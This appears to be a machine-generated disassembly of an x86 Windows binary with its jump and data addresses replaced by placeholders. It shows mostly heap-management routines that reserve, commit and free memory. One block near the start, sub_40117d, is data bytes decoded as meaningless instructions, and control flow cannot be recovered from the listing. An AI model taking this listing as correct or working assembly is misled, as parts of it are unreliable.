sub_40115b
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031d8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_40117d
pop ebp
adc [ eax ] eax
adc [ bx + si ] eax
jno r-xdata
add [ eax ] al
add [ eax ] al
inc esi
jge r-xdata
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
mov [ ecx ] edx
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
sbb [ esi + 0x40 ] dl
add [ esi + edx * 2 ] ah
inc eax
add [ eax + 0x74004033 ] al
xor eax [ eax ]
xor al 0x56
inc eax
add al bl
xor [ eax ] al
adc al 0x31
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f80040 ] cl
inc eax
add [ ecx + 0x4011 ] cl
sar bh 0x25
jb r-xdata
test al 0xb1
inc edi
add [ ebx - 0x5bda0040 ] cl
mov cl 0x47
add [ ebx - 0x5fda0040 ] cl
mov cl 0x47
add [ ebx - 0x63da0040 ] cl
mov cl 0x47
add [ ebx - 0x67da0040 ] cl
mov cl 0x47
add [ ebx - 0x6bda0040 ] cl
mov cl 0x47
add [ ebx - 0x6fda0040 ] cl
mov cl 0x47
add [ ebx - 0x73da0040 ] cl
mov cl 0x47
add [ ebx - 0x77da0040 ] cl
mov cl 0x47
add [ ebx - 0x7bda0040 ] cl
mov cl 0x47
add [ ebx - 0x27da0040 ] cl
mov cl 0x47
add [ ebx - 0x7fda0040 ] cl
mov cl 0x47
add [ ebx + 0x7c25ffc0 ] cl
mov cl 0x47
add [ ebx + 0x7825ffc0 ] cl
mov cl 0x47
add [ ebx - 0xfda0040 ] cl
mov cl 0x47
add [ ebx - 0x13da0040 ] cl
mov cl 0x47
add [ ebx - 0x17da0040 ] cl
mov cl 0x47
add [ ebx + 0x7425ffc0 ] cl
mov cl 0x47
add [ ebx + 0x7025ffc0 ] cl
mov cl 0x47
add [ ebx + 0x25ffc0 ] cl
mov dl 0x47
add [ ebx - 0x3da0040 ] cl
mov cl 0x47
add [ ebx - 0x7da0040 ] cl
mov cl 0x47
add [ ebx + 0x6c25ffc0 ] cl
mov cl 0x47
add [ ebx + 0x6825ffc0 ] cl
mov cl 0x47
add [ ebx + 0x6425ffc0 ] cl
mov cl 0x47
add [ ebx + 0x6025ffc0 ] cl
mov cl 0x47
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401398
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401358
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013f0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401398
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401438
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401420
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401420
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013f0
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013f0
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401420
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40153c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f0
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401368
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401370
xor eax eax
mov [ ebx ] eax
sub_4015a0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401368
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401368
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f0
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401370
xor eax eax
mov [ ebx ] eax
sub_401618
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401370
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401420
mov [ rw-data ] 0x1
sub_4016d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401368
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_401764
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401370
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_40153c
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016d0
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401438
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401618
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401420
jmp r-xdata
sub_401874
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4015a0
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401438
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_4015a0
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401618
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401438
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016d0
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401618
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401420
jmp r-xdata
sub_401998
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_401764
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401438
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401618
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014a8
jmp r-xdata
sub_401a24
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ada
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401378
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013e8
mov eax rw-data
call sub_4013e8
mov eax rw-data
call sub_4013e8
push 0xff8
push 0x0
call sub_401358
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ae1
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401388
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ae8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bbe
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401380
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401370
mov ebx [ ebx ]
mov eax rw-data
call sub_4013e8
mov eax rw-data
call sub_4013e8
mov eax rw-data
call sub_4013e8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401390
retn
push rw-data
call sub_401388
sub_401bc8
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c2c
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c5c
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e30
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401cb0
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c8c
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cd8
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bc8
add ebx esi
mov [ rw-data ] 0x6
sub_401d48
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bc8
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c2c
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401998
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401998
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c5c
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014a8
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401cb0
sub_401e30
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d80
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401eb8
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c8c
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f04
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401eb8
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401438
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cd8
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d48
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c5c
sub [ edi + 0x4 ] 0x4
sub_401f90
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017e4
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f04
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fbc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_401874
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f04
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401ff0
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_40201c
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bc8
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e30
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f90
test al al
jne r-xdata
mov eax esi
call sub_401ff0
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402110
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a24
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_40228c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401380
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_40201c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401388
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_40395c
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_40395c
jmp r-xdata
sub_4022a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_402432
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a24
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401380
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
